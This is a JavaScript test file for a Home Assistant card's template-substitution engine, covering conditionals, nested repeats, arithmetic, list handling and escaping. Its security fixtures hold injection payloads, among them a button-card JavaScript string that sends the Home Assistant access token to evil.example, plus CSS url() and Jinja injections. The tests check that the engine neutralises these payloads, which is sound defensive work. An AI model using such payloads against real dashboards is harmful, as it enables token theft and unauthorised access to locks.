const carElement = { type: 'conditional', conditions: [{ entity: '[[car_entity]]', state: 'on' }] };
const elements = { elements: ['[[light_element?]]', '[[car_element|if:car_entity?]]'] };
check(
  'if keeps a whole mapping when the variable it reads is set',
  deepReplace([{ car_entity: 'binary_sensor.car' }], { default: [{ car_element: carElement }] }, elements),
  { elements: [{ type: 'conditional', conditions: [{ entity: 'binary_sensor.car', state: 'on' }] }] },
);
warnings.length = 0;
check(
  'if drops an optional list item when the variable it reads is not set',
  deepReplace([], { default: [{ car_element: carElement }] }, elements),
  {},
);
check('a closed optional if is the point of it, not something to warn about', warnings, []);
check(
  'if reads its variable the way bool does, so false closes it',
  deepReplace([{ car_entity: false }, { car_element: carElement }], {}, elements),
  {},
);
check(
  'if:name=text holds only when the variable is exactly that text',
  [
    deepReplace(
      [{ provider: 'go2rtc' }, { block: { stream: 'cam' } }],
      {},
      { go2rtc: '[[block|if:provider=go2rtc?]]' },
    ),
    deepReplace([{ provider: 'image' }, { block: { stream: 'cam' } }], {}, { go2rtc: '[[block|if:provider=go2rtc?]]' }),
    deepReplace([{ block: { stream: 'cam' } }], {}, { go2rtc: '[[block|if:provider=go2rtc?]]' }),
  ],
  [{ go2rtc: { stream: 'cam' } }, {}, {}],
);
check(
  'if:name=text compares a number as text',
  deepReplace([{ columns: 2 }, { wide: 'yes' }], {}, { a: '[[wide|if:columns=2]]', b: '[[wide|if:columns=3?]]' }),
  { a: 'yes' },
);
check(
  'if composes with the text transforms, wherever it sits in the chain',
  deepReplace(
    [{ room: 'Living Room' }, { show: true }],
    {},
    { a: '[[room|if:show|slug]]', b: '[[room|slug|if:show]]' },
  ),
  { a: 'living_room', b: 'living_room' },
);
check(
  'a closed if is a gap, so a default after it stands in',
  deepReplace([{ name: 'Kitchen' }, { show: false }], {}, { name: '[[name|if:show|default:Hidden]]' }),
  { name: 'Hidden' },
);
check(
  'every if in a chain has to hold',
  deepReplace([{ v: 'x' }, { a: true }, { b: false }], {}, { one: '[[v|if:a|if:b?]]', both: '[[v|if:a|if:a]]' }),
  { both: 'x' },
);
console.warn = (m) => warnings.push(m);
warnings.length = 0;
check(
  'a closed if with no ? and no default stays visible',
  deepReplace([{ v: 'x' }, { show: false }], {}, { name: '[[v|if:show]]' }),
  { name: '[[v|if:show]]' },
);
check(
  'and says it was the condition, not a missing variable',
  warnings.length === 1 && /if:/.test(warnings[0]) && !/nothing gives a value/.test(warnings[0]),
  true,
);
console.warn = realWarn;
check(
  'if inside a longer piece of text drops just that part',
  deepReplace([{ unit: 'kWh' }, { show: false }], {}, { name: 'Energy [[unit|prefix:(|suffix:)|if:show?]]' }),
  { name: 'Energy ' },
);
check(
  'if reads a let value as it ends up, not as it was written',
  [
    deepReplace(
      [{ provider: 'go2rtc' }, { v: 'x' }],
      { let: { live: '[[provider|map:go2rtc=yes,*=]]' } },
      {
        a: '[[v|if:live?]]',
      },
    ),
    deepReplace(
      [{ provider: 'image' }, { v: 'x' }],
      { let: { live: '[[provider|map:go2rtc=yes,*=]]' } },
      {
        a: '[[v|if:live?]]',
      },
    ),
  ],
  [{ a: 'x' }, {}],
);
check(
  'a condition reading itself is stopped rather than followed forever',
  deepReplace([{ loop: '[[v|if:loop]]' }, { v: 'x' }], {}, { a: '[[v|if:loop?]]' }, undefined, undefined, true),
  { a: 'x' },
);
check(
  'the example from discussion #150 renders as asked',
  [
    deepReplace(
      [{ detect_car_entity: 'binary_sensor.car' }],
      {
        default: [
          {
            detect_car_element: { type: 'conditional', conditions: [{ entity: '[[detect_car_entity]]', state: 'on' }] },
          },
          { light_switch_element: { type: 'icon', entity: '[[light_switch_entity]]' } },
        ],
      },
      {
        elements: ['[[light_switch_element|if:light_switch_entity?]]', '[[detect_car_element|if:detect_car_entity?]]'],
      },
    ),
  ],
  [{ elements: [{ type: 'conditional', conditions: [{ entity: 'binary_sensor.car', state: 'on' }] }] }],
);

/* --------------------------------------------------- a variable bomb is stopped */

// A chain where each variable expands into two of the next doubles the text on every step,
// reaching a gigabyte within a single pass. The size ceiling stops it partway rather than
// letting it run the tab out of memory, so the result stays small and the call returns.
const bomb = [];
for (let i = 0; i < 25; i += 1) bomb.push({ [`v${i}`]: `[[v${i + 1}]][[v${i + 1}]]` });
bomb.push({ v25: 'X' });
check(
  'an exponential variable chain is stopped rather than expanded',
  JSON.stringify(deepReplace(bomb, {}, { content: '[[v0]]' })).length < 3_000_000,
  true,
);

/* ------------------------------------------- a key looked up by another variable (#192) */

const LOOKUP = {
  default: [
    { colours: { error: 'red', good: 'green' } },
    { modes: { live: { provider: 'go2rtc', link: 'http://cam/[[name]]' }, image: { provider: 'image' } } },
  ],
};

check(
  'a placeholder inside a placeholder picks a key out of a mapping',
  deepReplace([{ level: 'error' }], LOOKUP, { color: '[[colours.[[level]]]]' }),
  { color: 'red' },
);

check(
  'a key the mapping does not have falls to default:',
  deepReplace([{ level: 'meh' }], LOOKUP, { color: '[[colours.[[level]]|default:grey]]' }),
  { color: 'grey' },
);

check(
  'a key the mapping does not have drops an optional option',
  deepReplace([{ level: 'meh' }], LOOKUP, { type: 'tile', color: '[[colours.[[level]]?]]' }),
  { type: 'tile' },
);

check(
  'a key the mapping has keeps an optional option',
  deepReplace([{ level: 'good' }], LOOKUP, { color: '[[colours.[[level]]?]]' }),
  { color: 'green' },
);

check(
  'a looked-up mapping goes in whole, its own placeholders filled',
  deepReplace([{ mode: 'live', name: 'porch' }], LOOKUP, { camera: '[[modes.[[mode]]]]' }),
  { camera: { provider: 'go2rtc', link: 'http://cam/porch' } },
);

/* ------------------------------------------ text from Home Assistant stays text (security) */

const INJECTION = 'true, "type": "iframe", "url": "https://evil.example/"';

check(
  'a chain ending in bool that went through an unknown step is refused, not pasted raw',
  deepReplace([{ name: INJECTION }], {}, { type: 'tile', show: '[[name|trim|json|bool]]' }),
  { type: 'tile', show: '[[name|trim|json|bool]]' },
);

check(
  'json first then bool is still the answer to whether there is anything there',
  deepReplace([{ name: INJECTION }], {}, { type: 'tile', show: '[[name|json|bool]]' }),
  { type: 'tile', show: true },
);

check(
  'a fallback chain ending in bool only ever yields true or false',
  deepReplace([], {}, { type: 'tile', show: '[[nope|default:' + INJECTION + '|bool]]' }),
  { type: 'tile', show: true },
);

const LOCK_HASS = {
  states: {
    'lock.front': { state: 'locked', attributes: { friendly_name: '[[zz?]]' } },
    'sensor.spoof': { state: 'on', attributes: { friendly_name: 'x', spoof: '[[model|trim|json|bool]]' } },
  },
};

check(
  'a friendly_name shaped like an optional placeholder is text, and takes nothing with it',
  deepReplace(
    [{ lock: 'lock.front' }],
    {},
    {
      tap_action: {
        action: 'perform-action',
        perform_action: 'lock.unlock',
        confirmation: { text: '[[lock|friendly_name]]' },
      },
    },
    undefined,
    LOCK_HASS,
  ),
  { tap_action: { action: 'perform-action', perform_action: 'lock.unlock', confirmation: { text: '[[zz?]]' } } },
);

check(
  'an attribute shaped like a placeholder is never substituted again',
  deepReplace(
    [{ e: 'sensor.spoof' }, { model: INJECTION }],
    {},
    { type: 'tile', name: '[[e|attr:spoof]]' },
    undefined,
    LOCK_HASS,
  ),
  { type: 'tile', name: '[[model|trim|json|bool]]' },
);

check(
  'an attribute carrying a proxy token is not handed out',
  deepReplace(
    [{ e: 'media_player.tv' }],
    {},
    { image: '[[e|attr:entity_picture_local]]', other: '[[e|attr:media_image_url]]' },
    undefined,
    {
      states: {
        'media_player.tv': {
          state: 'on',
          attributes: {
            entity_picture_local: '/api/media_player_proxy/media_player.tv?token=abc',
            media_image_url: 'https://cdn.example/x.jpg?token=abc',
          },
        },
      },
    },
  ),
  { image: '[[e|attr:entity_picture_local]]', other: '[[e|attr:media_image_url]]' },
);

check(
  'an inherited name used as a chain step is not a transform and does not throw',
  deepReplace([], {}, { x: '[[nope|default:a|__proto__]]', y: '[[nope|default:a|__defineGetter__]]' }),
  { x: '[[nope|default:a|__proto__]]', y: '[[nope|default:a|__defineGetter__]]' },
);

/* ------------------------------------------------------- the ceiling holds per replacement */

const FAN = 200;
const fanOut = (name) => Array(FAN).fill(`[[${name}]]`).join('');
const fanned = deepReplace(
  [{ v1: fanOut('v2') }, { v2: fanOut('v3') }, { v3: fanOut('v4') }],
  {},
  { content: '[[v1]]' },
);
check(
  'a value holding many placeholders cannot multiply the text past about the ceiling',
  JSON.stringify(fanned).length < 2_100_000,
  true,
);

/* ------------------------------------------------------------------ styles shielded */

check(
  'a shield is applied to what Home Assistant gives, not to what the author wrote',
  deepReplace(
    [{ e: 'light.x' }, { colour: 'red; }' }],
    {},
    'color: [[e|friendly_name]]; --mine: [[colour]];',
    undefined,
    { states: { 'light.x': { state: 'on', attributes: { friendly_name: 'blue; background: url(https://evil/)' } } } },
    false,
    undefined,
    0,
    undefined,
    cssSafe,
  ),
  // The shield takes the `(`, `)` and `/` as well now, so a name cannot open a url().
  'color: blue background: urlhttps:evil; --mine: red; };',
);

check(
  'a stand-in after a split is split too, and never spliced in as structure it only spelt',
  deepReplace(
    [{ name: '[{"type":"iframe","url":"https://evil.example/"}]' }],
    {},
    { a: '[[rows|split|or:name]]', b: '[[rows|split|default:a, b]]', c: '[[rows|split|or:name|count]]' },
  ),
  { a: ['[{"type":"iframe"', '"url":"https://evil.example/"}]'], b: ['a', 'b'], c: 2 },
);

/* ------------------------------------- Home Assistant text cannot become a placeholder */

// Review 2026-10-18. The escape has to hold whatever is done to the text afterwards and
// whatever it sits next to - a name only has to end up forming `[[` to be read as code.
const hostile = {
  states: {
    'light.x': { attributes: { friendly_name: 'url(https://evil.example/[{[tracker|attr:latitude]}])' } },
    'device_tracker.t': { attributes: { latitude: 57.1234 } },
    'lock.d': { attributes: { friendly_name: '[[zz?]]' } },
  },
  entities: { 'lock.d': { device_id: 'dev2', area_id: 'a1' } },
  devices: { dev2: { name: '[[zz' } },
  areas: { a1: { name: '?]]' } },
};
check(
  'a shield cannot uncover a placeholder: the braces go and the brackets go with them',
  deepReplace(
    [{ entity: 'light.x' }, { tracker: 'device_tracker.t' }],
    {},
    { s: 'background: [[entity|friendly_name]]' },
    undefined,
    hostile,
    true,
    undefined,
    0,
    undefined,
    cssSafe,
  ).s.includes('57.1234'),
  false,
);
check(
  'two Home Assistant strings side by side do not form a placeholder',
  deepReplace(
    [{ entity: 'lock.d' }],
    {},
    { confirmation: '[[entity|device]][[entity|area]]', name: 'x' },
    undefined,
    hostile,
    true,
  ),
  { confirmation: '[[zz?]]', name: 'x' },
);
const outerBuilt = deepReplace(
  [{ entity: 'lock.d' }],
  {},
  {
    type: 'vertical-stack',
    cards: [
      { type: 'custom:decluttering-card-plus', template: 'inner', variables: [{ label: '[[entity|friendly_name]]' }] },
      { type: 'markdown', content: '[[entity|friendly_name]]' },
    ],
  },
  undefined,
  hostile,
  true,
);
check(
  'a nested card is handed the text still marked, while the rest is written out',
  outerBuilt.cards.map((card) => {
    const text = card.variables?.[0].label ?? card.content;
    return [text.includes('[['), text.replace(/\u2060/g, '')];
  }),
  [
    [false, '[[zz?]]'],
    [true, '[[zz?]]'],
  ],
);
check(
  'so the nested card reads it as text too, and keeps the key it lands in',
  deepReplace(
    outerBuilt.cards[0].variables,
    {},
    { tap_action: { action: 'toggle', confirmation: '[[label]]' } },
    undefined,
    hostile,
    true,
  ),
  { tap_action: { action: 'toggle', confirmation: '[[zz?]]' } },
);
check(
  'a build asked to keep its escapes keeps every one, for values handed down to another card',
  deepReplace(
    [{ entity: 'lock.d' }],
    {},
    [{ label: '[[entity|friendly_name]]' }],
    undefined,
    hostile,
    true,
    undefined,
    0,
    undefined,
    undefined,
    true,
  ).map((entry) => [entry.label.includes('[['), entry.label.replace(/\u2060/g, '')]),
  [[false, '[[zz?]]']],
);

/* ----------------------------- Home Assistant text cannot open another language either */

// Review 2026-10-25. Escaping `[[` kept a name from being read as one of this card's
// placeholders, but the final pass wrote the name back exactly as it was - so a name of
// `[[[ ... ]]]` reached button-card as JavaScript, `{{ ... }}` reached a markdown card as
// Jinja, and a `replace:` or `join:` in the chain could take the escape off before then.
// Home Assistant's text now carries an invisible word joiner around every bracket and
// brace until the build is done, and keeps one wherever writing it out would open code.
const WJ = '⁠';
const naming = {
  states: {
    'light.js': {
      attributes: { friendly_name: "[[[ return fetch('https://evil.example/' + hass.auth.data.access_token) ]]]" },
    },
    'light.jinja': {
      attributes: { friendly_name: '{{ states.lock.front.attributes.code }} and {% if 1 %}x{% endif %}' },
    },
    'light.tpl': { attributes: { friendly_name: '${ states["lock.front"].attributes.code }' } },
    'light.plain': { attributes: { friendly_name: 'Hall [1] {left}' } },
    'light.brace': { attributes: { friendly_name: 'Hall {left}' } },
    'light.bang': { attributes: { friendly_name: 'Hi! [[x]]' } },
    'light.spaced': { attributes: { friendly_name: '[ [zz?]]' } },
    'light.split': { attributes: { friendly_name: '[,[zz?]]' } },
    'light.half1': { attributes: { friendly_name: '[' } },
    'light.half2': { attributes: { friendly_name: '[zz?]]' } },
    'light.tail': { attributes: { friendly_name: 'foo[' } },
    'light.head': { attributes: { friendly_name: '[x]]' } },
    'light.css': { attributes: { friendly_name: 'red;} ha-card{background:url(https://evil.example/p)} x{' } },
  },
};
const named = (entity, field = 'name', extra = {}) =>
  deepReplace(
    [{ e: entity }, { x: 'SECRET' }],
    {},
    { type: 'custom:button-card', [field]: '[[e|friendly_name]]', ...extra },
    undefined,
    naming,
    true,
  );

check(
  'a name shaped like button-card JavaScript cannot start with three brackets',
  named('light.js').name.startsWith('[[['),
  false,
);
check(
  'but it still reads as the name, joiner aside',
  named('light.js').name.replace(new RegExp(WJ, 'g'), ''),
  "[[[ return fetch('https://evil.example/' + hass.auth.data.access_token) ]]]",
);
check(
  'a name shaped like Jinja opens no Jinja',
  [/\{\{/.test(named('light.jinja').name), /\{%/.test(named('light.jinja').name)],
  [false, false],
);
check('a name shaped like a config-template-card expression opens none', /\$\{/.test(named('light.tpl').name), false);
check(
  'an ordinary name with brackets and braces comes out exactly as written',
  named('light.plain').name,
  'Hall [1] {left}',
);
check(
  'a replace: that takes the bang out does not make a placeholder',
  deepReplace(
    [{ e: 'light.bang' }, { x: 'SECRET' }],
    {},
    { a: '[[e|friendly_name|replace:!:]]' },
    undefined,
    naming,
    true,
  ).a,
  'Hi [[x]]',
);
check(
  'a replace: that closes a gap does not make an optional placeholder, and the key stays',
  deepReplace(
    [{ e: 'light.spaced' }],
    {},
    { confirmation: '[[e|friendly_name|replace: :]]', n: 1 },
    undefined,
    naming,
    true,
  ),
  { confirmation: '[[zz?]]', n: 1 },
);
check(
  'a split and an empty join do not make one either',
  deepReplace(
    [{ e: 'light.split' }],
    {},
    { confirmation: '[[e|friendly_name|split|join:]]', n: 1 },
    undefined,
    naming,
    true,
  ),
  { confirmation: '[[zz?]]', n: 1 },
);
check(
  'two names side by side do not form a placeholder',
  deepReplace(
    [{ a: 'light.half1' }, { b: 'light.half2' }, { x: 'SECRET' }],
    {},
    { confirmation: '[[a|friendly_name]][[b|friendly_name]]', n: 1 },
    undefined,
    naming,
    true,
  ),
  { confirmation: '[[zz?]]', n: 1 },
);
check(
  'nor a name ending in a bracket beside one starting with one',
  deepReplace(
    [{ a: 'light.tail' }, { b: 'light.head' }, { x: 'SECRET' }],
    {},
    { s: '[[a|friendly_name]][[b|friendly_name]]' },
    undefined,
    naming,
    true,
  ).s,
  'foo[[x]]',
);
check(
  "nor the author's own bracket beside a name starting with one",
  deepReplace([{ b: 'light.head' }, { x: 'SECRET' }], {}, { s: '[[[b|friendly_name]]' }, undefined, naming, true).s,
  '[[x]]',
);
check(
  'a name in a card_mod style is shielded like one in the template style',
  named('light.css', 'name', {
    card_mod: { style: 'ha-card { --name: "[[e|friendly_name]]"; }' },
  }).card_mod.style.includes('url('),
  false,
);
check(
  'and so is one in a button-card styles block and a legacy style key',
  [
    named('light.css', 'name', { styles: { card: [{ color: '[[e|friendly_name]]' }] } }).styles.card[0].color.includes(
      '}',
    ),
    named('light.css', 'name', { style: 'ha-card { color: [[e|friendly_name]] }' }).style.includes('url('),
  ],
  [false, false],
);
check(
  'a shielded name is still a name outside the styles',
  named('light.css').name,
  'red;} ha-card{background:url(https://evil.example/p)} x{',
);
check(
  'the joiner never reaches a comparison: a condition on a bracketed name still holds',
  deepReplace(
    [{ e: 'light.brace' }, { n: '[[e|friendly_name]]' }],
    {},
    { a: '[[n|if:n=Hall {left}]]' },
    undefined,
    naming,
    true,
  ).a,
  'Hall {left}',
);
check(
  'a value handed to a nested card keeps its joiners, and that card writes the name out',
  (() => {
    const outer = deepReplace(
      [{ e: 'light.js' }],
      {},
      { type: 'custom:decluttering-card-plus', template: 'inner', variables: [{ label: '[[e|friendly_name]]' }] },
      undefined,
      naming,
      true,
    );
    const inner = deepReplace(outer.variables, {}, { name: '[[label]]' }, undefined, naming, true);
    return [
      outer.variables[0].label.includes(WJ),
      inner.name.startsWith('[[['),
      inner.name.replace(new RegExp(WJ, 'g'), '').startsWith('[[['),
    ];
  })(),
  [true, false, true],
);

{
  // Review 2026-10-25. A repeat inside a repeat over a long list is as many builds as the
  // product of the two, and used to run them all before the size ceiling saw the result.
  const items = Array.from({ length: 200 }, (_, i) => ({ item: `x${i}` }));
  const started = Date.now();
  const out = deepReplace(
    [{ list: items }, { inner: { a: '[[item]] [[inner2|repeat:list]]' } }, { inner2: { b: '[[item]]' } }],
    {},
    { rows: '[[inner|repeat:list]]' },
    undefined,
    undefined,
    true,
  );
  check(
    'a repeat inside a repeat stops after two thousand copies rather than building forty thousand',
    [Array.isArray(out.rows), Date.now() - started < 2000],
    [true, true],
  );
  check(
    'a repeat that fits is unaffected',
    deepReplace([{ list: items.slice(0, 50) }, { inner: { a: '[[item]]' } }], {}, { rows: '[[inner|repeat:list]]' })
      .rows.length,
    50,
  );
}

{
  // #311: a repeat inside a repeat. Without |flat each outer copy that is a list stays one;
  // with it the copies are laid out in one list. An item without the inner list gives none.
  const detect = [
    { detect_type: 'car', zones: ['front', 'street'] },
    { detect_type: 'person', zones: ['front'] },
    { detect_type: 'cat' },
  ];
  const vars = [
    { detect_list: detect },
    { zone_t: 'binary_sensor.[[item]]_[[detect_type]]' },
    { per: ['[[zone_t|repeat:zones]]', 'binary_sensor.porch_[[detect_type]]'] },
  ];
  check(
    'a nested repeat without flat keeps a list per copy',
    deepReplace(vars, {}, { entities: '[[per|repeat:detect_list]]' }, undefined, undefined, true).entities,
    [
      ['binary_sensor.front_car', 'binary_sensor.street_car', 'binary_sensor.porch_car'],
      ['binary_sensor.front_person', 'binary_sensor.porch_person'],
      ['binary_sensor.porch_cat'],
    ],
  );
  check(
    'repeat:...|flat lays the copies out in one list, and a copy without the inner list adds none of it',
    deepReplace(vars, {}, { entities: ['sensor.first', '[[per|repeat:detect_list|flat]]'] }, undefined, undefined, true)
      .entities,
    [
      'sensor.first',
      'binary_sensor.front_car',
      'binary_sensor.street_car',
      'binary_sensor.porch_car',
      'binary_sensor.front_person',
      'binary_sensor.porch_person',
      'binary_sensor.porch_cat',
    ],
  );
  check(
    'flat leaves a copy that is not a list as it is, and only goes one level',
    deepReplace(
      [{ l: [{ v: 'a' }, { v: 'b' }] }, { body: '[[v]]' }, { pair: [['[[v]]']] }],
      {},
      { x: '[[body|repeat:l|flat]]', y: '[[pair|repeat:l|flat]]' },
      undefined,
      undefined,
      true,
    ),
    { x: ['a', 'b'], y: [['a'], ['b']] },
  );
  const caught = [];
  const saved = console.warn;
  console.warn = (...m) => caught.push(m.join(' '));
  check(
    'at the card level a missing list is still left visible and warned about',
    [deepReplace([{ zone_t: 'x' }], {}, { e: '[[zone_t|repeat:zones]]' }), caught.some((m) => m.includes('zones'))],
    [{ e: '[[zone_t|repeat:zones]]' }, true],
  );
  caught.length = 0;
  check(
    'flat anywhere but after a repeat is refused and left visible',
    [
      deepReplace([{ a: 'x' }, { m: { k: 'v' } }], {}, { p: '[[a|flat]]', q: '[[m|with:k=1|flat]]' }),
      caught.some((m) => m.includes('flat only works straight after a repeat:')),
    ],
    [{ p: '[[a|flat]]', q: '[[m|with:k=1|flat]]' }, true],
  );
  console.warn = saved;
  const traced = { placeholders: new Map(), dropped: [], warnings: [] };
  deepReplace(
    [{ detect_list: [{ d: 'cat' }] }, { zone_t: '[[item]]' }, { per: ['[[zone_t|repeat:zones]]'] }],
    {},
    { e: '[[per|repeat:detect_list|flat]]' },
    undefined,
    undefined,
    true,
    undefined,
    0,
    traced,
  );
  check('the debug trace says why a copy gave nothing', traced.items[0].trace.dropped, [
    '[[zone_t|repeat:zones]] gave nothing: this copy has no zones',
  ]);
}

/* ------------------------------------------------------------ arithmetic */

{
  const caught = [];
  const saved = console.warn;
  console.warn = (m) => caught.push(m);

  check(
    'a chain of sums places a picture element, a percentage inside a string',
    deepReplace([{ index: 3 }], {}, { style: { left: '[[index|sub:1|mul:12|add:4]]%' } }),
    { style: { left: '28%' } },
  );

  check(
    'arithmetic as the whole value is a real number',
    deepReplace([{ index: 3 }], {}, { columns: '[[index|mul:2]]' }),
    { columns: 6 },
  );

  check(
    'div and mod, decimals and negatives',
    deepReplace([{ w: 7 }], {}, { a: '[[w|div:2]]', b: '[[w|mod:3]]', c: '[[w|sub:10]]', d: '[[w|mul:-0.5]]' }),
    { a: 3.5, b: 1, c: -3, d: -3.5 },
  );

  check('a sum comes out the way a person would write it', deepReplace([{ x: 0.1 }], {}, { v: '[[x|add:0.2]]' }), {
    v: 0.3,
  });

  check(
    'round to a whole number, and to places',
    deepReplace([{ t: '21.456' }], {}, { a: '[[t|round]]', b: '[[t|round:2]]', c: '[[t|round:1]] °C' }),
    { a: 21, b: 21.46, c: '21.5 °C' },
  );

  check('round:2 inside a string keeps its trailing zero', deepReplace([{ t: 2.5 }], {}, { v: 'Now [[t|round:2]]' }), {
    v: 'Now 2.50',
  });

  check('round reads 1.005 as written', deepReplace([{ t: 1.005 }], {}, { v: '[[t|round:2]]' }), { v: 1.01 });

  check(
    'pad zero-pads a whole number and stays text',
    deepReplace([{ n: 7 }, { m: -7 }], {}, { a: '[[n|pad:3]]', b: 'zone_[[n|pad:2]]', c: '[[m|pad:3]]' }),
    { a: '007', b: 'zone_07', c: '-07' },
  );

  check('pad leaves a number already wider than asked alone', deepReplace([{ n: 1234 }], {}, { a: '[[n|pad:3]]' }), {
    a: '1234',
  });

  check('nothing was complained about along the way', caught, []);

  check(
    'a value that is not a number is left as it was',
    deepReplace([{ name: 'Hall' }], {}, { a: '[[name|add:1]]', b: 'x[[name|round]]' }),
    { a: 'Hall', b: 'xHall' },
  );

  check('and the console says so, once per step and value', caught.length, 2);

  caught.length = 0;
  deepReplace([{ name: 'Hall' }], {}, { a: '[[name|add:1]]' });
  check('the same complaint is not repeated', caught, []);

  check(
    'pad on a decimal, and a bad argument, leave the value as it was',
    deepReplace([{ n: 2.5 }], {}, { a: '[[n|pad:3]]', b: '[[n|div:0]]', c: '[[n|add:lots]]', d: '[[n|round:99]]' }),
    { a: '2.5', b: 2.5, c: 2.5, d: 2.5 },
  );

  check('each of those says why', caught.length, 4);

  check(
    'an argument can come from another variable once that is substituted',
    deepReplace([{ index: 3 }, { offset: 10 }], {}, { v: '[[index|add:[[offset]]]]' }),
    { v: 13 },
  );

  check(
    'a default after arithmetic still stands in, and is checked before going in bare',
    deepReplace([], {}, { a: '[[gone|add:1|default:0]]', b: '[[gone|add:1|default:none]]' }),
    { a: 0, b: 'none' },
  );

  check(
    'a chain that carries on after the sum gives text',
    deepReplace([{ n: 3 }], {}, { v: '[[n|add:1|prefix:#]]' }),
    { v: '#4' },
  );

  console.warn = saved;
}

/* ------------------------------------------------------------------ lists */

{
  const caught = [];
  const saved = console.warn;
  console.warn = (m) => caught.push(m);
  const rooms = [{ rooms: ['Kitchen', 'Hall', 'Back Porch'] }];

  check(
    'join writes a list as text, ", " unless told otherwise',
    deepReplace(rooms, {}, { a: '[[rooms|join]]', b: 'In: [[rooms|join: / ]]', c: '[[rooms|join:]]' }),
    { a: 'Kitchen, Hall, Back Porch', b: 'In: Kitchen / Hall / Back Porch', c: 'KitchenHallBack Porch' },
  );

  check(
    'first, last and count read a list',
    deepReplace(rooms, {}, { first: '[[rooms|first]]', last: '[[rooms|last|upper]]', count: '[[rooms|count]]' }),
    { first: 'Kitchen', last: 'BACK PORCH', count: 3 },
  );

  check('count inside a string is its text', deepReplace(rooms, {}, { name: '[[rooms|count]] rooms' }), {
    name: '3 rooms',
  });

  check(
    'split as the whole value makes a real list, items trimmed and empties dropped',
    deepReplace([{ ids: 'light.a, light.b,,light.c ' }], {}, { entities: '[[ids|split]]' }),
    { entities: ['light.a', 'light.b', 'light.c'] },
  );

  check('split takes a separator of its own', deepReplace([{ ids: 'a;b; c' }], {}, { entities: '[[ids|split:;]]' }), {
    entities: ['a', 'b', 'c'],
  });

  check(
    'a step after split shapes each item, and join puts them back together',
    deepReplace([{ names: 'Living Room, Hall' }], {}, { a: '[[names|split|slug]]', b: '[[names|split|slug|join:,]]' }),
    { a: ['living_room', 'hall'], b: 'living_room,hall' },
  );

  check(
    'a comma string is a list to first, last and count',
    deepReplace([{ t: 'a, b, c' }], {}, { f: '[[t|first]]', l: '[[t|last]]', n: '[[t|count]]' }),
    { f: 'a', l: 'c', n: 3 },
  );

  check(
    'a plain word counts as one, an empty string and a null as none',
    deepReplace(
      [{ w: 'kitchen' }, { e: '' }, { z: null }],
      {},
      { w: '[[w|count]]', e: '[[e|count]]', z: '[[z|count]]' },
    ),
    { w: 1, e: 0, z: 0 },
  );

  check(
    'count of a variable nothing sets is 0, not an unset placeholder',
    deepReplace([], {}, { n: '[[nobody|count]]' }),
    { n: 0 },
  );

  check('a mapping counts its keys', deepReplace([{ m: { a: 1, b: 2 } }], {}, { n: '[[m|count]]' }), { n: 2 });

  check('split of a list leaves it a list', deepReplace([{ l: [1, 2] }], {}, { v: '[[l|split]]' }), { v: [1, 2] });

  check(
    'an item that is a mapping comes out as its JSON',
    deepReplace([{ l: [{ a: 1 }] }], {}, { v: 'x [[l|first]]' }),
    { v: 'x {"a":1}' },
  );

  check(
    'an empty list joins to nothing, so a default after it stands in',
    deepReplace([{ l: [] }], {}, { a: '[[l|join|default:none]]', b: '[[l|first|default:none]]', n: '[[l|count]]' }),
    { a: 'none', b: 'none', n: 0 },
  );

  check(
    'split inside a longer string writes the list out as JSON',
    deepReplace([{ t: 'a,b' }], {}, { v: 'list: [[t|split]]' }),
    { v: 'list: ["a","b"]' },
  );

  check(
    'labels from the registry are a list to first and count',
    deepReplace(
      [{ e: 'light.x' }],
      {},
      { f: '[[e|labels|first]]', n: '[[e|labels|count]]', l: '[[e|labels|split]]' },
      undefined,
      { entities: { 'light.x': { labels: ['a', 'b'] } }, labels: { a: { name: 'Upstairs' }, b: { name: 'Lights' } } },
    ),
    { f: 'Upstairs', n: 2, l: ['Upstairs', 'Lights'] },
  );

  check(
    'a text transform straight onto a list is still refused, as before',
    deepReplace([{ l: ['a'] }], {}, { v: '[[l|upper]]' }),
    { v: '[[l|upper]]' },
  );

  check(
    'join on a mapping is refused, it has no order to join',
    deepReplace([{ m: { a: 1 } }], {}, { v: '[[m|join]]' }),
    { v: '[[m|join]]' },
  );

  console.warn = saved;
}

check(
  'translate in a card: an integration name and a full key, the unknown left as written',
  deepReplace(
    [{ integration: 'hue' }, { other: 'nothing_here' }],
    {},
    { title: '[[integration|translate]]', sub: 'via [[other|translate]]' },
    undefined,
    { localize: (key) => (key === 'component.hue.title' ? 'Philips Hue' : '') },
  ),
  { title: 'Philips Hue', sub: 'via nothing_here' },
);

// #210: if: turned round, exists, contains: and find:.
const known = { states: { 'binary_sensor.hall_motion': { state: 'off', attributes: {} } }, entities: {} };
check(
  'if:!name holds while the variable is a no or unset',
  [
    deepReplace([{ show: false }, { v: 'x' }], {}, { a: '[[v|if:!show?]]' }),
    deepReplace([{ v: 'x' }], {}, { a: '[[v|if:!show?]]' }),
    deepReplace([{ show: true }, { v: 'x' }], {}, { a: '[[v|if:!show?]]' }),
  ],
  [{ a: 'x' }, { a: 'x' }, {}],
);
check(
  'if:name!=text holds for anything but that text, an unset variable included',
  [
    deepReplace([{ mode: 'auto' }, { v: 'x' }], {}, { a: '[[v|if:mode!=off?]]' }),
    deepReplace([{ v: 'x' }], {}, { a: '[[v|if:mode!=off?]]' }),
    deepReplace([{ mode: 'off' }, { v: 'x' }], {}, { a: '[[v|if:mode!=off?]]' }),
  ],
  [{ a: 'x' }, { a: 'x' }, {}],
);
check(
  'exists puts a real true or false in for an entity Home Assistant does or does not know',
  [
    deepReplace([{ m: 'binary_sensor.hall_motion' }], {}, { a: '[[m|exists]]' }, undefined, known),
    deepReplace([{ m: 'binary_sensor.attic_motion' }], {}, { a: '[[m|exists]]' }, undefined, known),
    deepReplace([], {}, { a: '[[m|exists]]' }, undefined, known),
  ],
  [{ a: true }, { a: false }, { a: false }],
);
check(
  'exists through a let variable gates another value with if:',
  deepReplace(
    [{ m: 'binary_sensor.attic_motion' }],
    { let: { has_motion: '[[m|exists]]' } },
    { a: '[[m|if:has_motion?]]', b: '[[m|if:!has_motion?]]' },
    undefined,
    known,
  ),
  { b: 'binary_sensor.attic_motion' },
);
check(
  'if_exists keeps an entity Home Assistant knows and is a gap for one it does not (#313)',
  deepReplace(
    [{ hall: 'binary_sensor.hall_motion', attic: 'binary_sensor.attic_motion' }],
    {},
    {
      a: '[[hall|if_exists]]',
      b: '[[attic|if_exists?]]',
      c: '[[attic|if_exists|default:none]]',
      d: '[[unset|if_exists?]]',
      e: '[[attic|if_exists|or:hall]]',
      f: ['[[hall|if_exists?]]', '[[attic|if_exists?]]'],
    },
    undefined,
    known,
  ),
  { a: 'binary_sensor.hall_motion', c: 'none', e: 'binary_sensor.hall_motion', f: ['binary_sensor.hall_motion'] },
);
check(
